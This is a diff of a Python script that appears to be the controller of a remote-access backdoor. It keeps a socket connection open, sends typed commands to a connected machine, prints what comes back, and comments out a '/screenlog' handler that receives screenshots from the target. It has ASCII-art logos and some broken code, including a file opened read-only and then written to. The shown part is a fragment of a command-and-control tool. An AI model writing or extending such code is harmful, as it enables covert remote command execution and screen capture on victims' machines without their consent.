@@ -40,7 +40,7 @@ logo3 = """
 """
 
 logo4 = """
-Art by Joan G. Stark
+    Art by Joan G. Stark
     ___
     \_/
      |._
@@ -83,15 +83,15 @@ if conn:
             break
         if cmd == "/stay":
             print(colored("[/] await the pc start!", "yellow"))
-        if cmd == "/screenlog":
-            print("[-] awaiting data ...")
-            data = conn.recv(BUFFER)
-            with open('screenshot.jpg', 'rb') as f:
-                try:
-                    f.write(data.decode('utf-8'))
-                    print(colored("data recived and photo saved", "green"))
-                except:
-                    print(colored("error to decode the img!","red"))
+        #if cmd == "/screenlog":
+        #    print("[-] awaiting data ...")
+        #    filename = conn.recv(BUFFER).decode("utf-8")
+        #    with open(filename, "wb") as f:
+        #        data = conn.recv(BUFFER)
+        #        if not data:
+        #            break
+        #        f.write(data)
+            
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
         print(output)
